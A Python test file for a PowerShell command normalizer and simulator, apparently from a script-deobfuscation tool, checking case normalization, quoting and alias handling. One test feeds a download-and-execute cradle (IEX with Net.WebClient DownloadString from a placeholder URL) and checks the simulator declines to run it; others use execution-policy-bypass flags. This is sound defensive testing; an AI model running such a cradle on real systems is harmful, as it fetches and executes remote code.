"""RC4.3 · Regression tests for the PowerShell normalizer + runtime simulator."""
import sys, pytest
sys.path.insert(0, "/app/backend")
# Ensure ops are registered
from operations import OPERATIONS
import ops_extended  # noqa
from decoders import (ps_encodedcommand_multilayer, ps_inline_eval,
                        batch_envvar_substitute, ps_reverse_swap,
                        ps_semantic_mini, ps_normalizer,
                        crypto_api_annotator, rc4_inline_decrypt)  # noqa

from operations import run_operation


def _run(cmd: str) -> str:
    return run_operation("powershell-normalize", cmd, {})


def test_reviewer_exact_example():
    out = _run("PoWeRsHeLl.eXe,-NoPrOfIlE,-ExEcUtIoNpOlIcY,ByPaSs,-CoMmAnD,"
                "\"Write-Host '[+] Mixed Case & Token Separation Test'\"")
    assert "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command" in out
    assert "[+] Mixed Case & Token Separation Test" in out
    assert "comma-token-separator" in out


def test_mixed_case_params():
    out = _run('powershell.exe -NoProfile -eXecUtIonPoLicY UnReStRiCtEd')
    assert "-ExecutionPolicy Unrestricted" in out


def test_preserves_quoted_commas():
    out = _run('powershell.exe -Command "Write-Host \'a,b,c,d\'"')
    assert "'a,b,c,d'" in out


def test_echo_alias():
    out = _run('powershell -Command "Echo \'hello\'"')
    assert "Runtime Output" in out and "hello" in out


def test_write_output_backtick_newline():
    out = _run("powershell -Command \"Write-Output 'line1`nline2'\"")
    assert "line1" in out and "line2" in out


def test_multiple_whitespace():
    out = _run("powershell.exe    -NoProfile     -Command   \"Write-Host 'x'\"")
    assert "powershell.exe -NoProfile -Command" in out


def test_unsafe_payload_not_simulated():
    """Invoke-Expression / IEX payloads MUST NOT emit a runtime simulation."""
    out = _run('powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://x/y\')"')
    assert "Runtime Output (Simulation · deterministic)" not in out
    assert "not attempted" in out or "not a safe built-in" in out


def test_malformed_command():
    """Malformed / unclosed quotes must not crash."""
    out = _run('powershell.exe -Command "Write-Host \'unterminated')
    assert "Reconstructed Command" in out  # doesn't raise


def test_nested_quotes():
    """Nested double-doubled quotes (PowerShell escape) preserved."""
    out = _run('powershell.exe -Command "Write-Host \'she said ""hi""\'"')
    assert "Reconstructed Command" in out


def test_pwsh_alias():
    out = _run('pwsh -Command "Echo \'core\'"')
    assert "pwsh.exe" in out
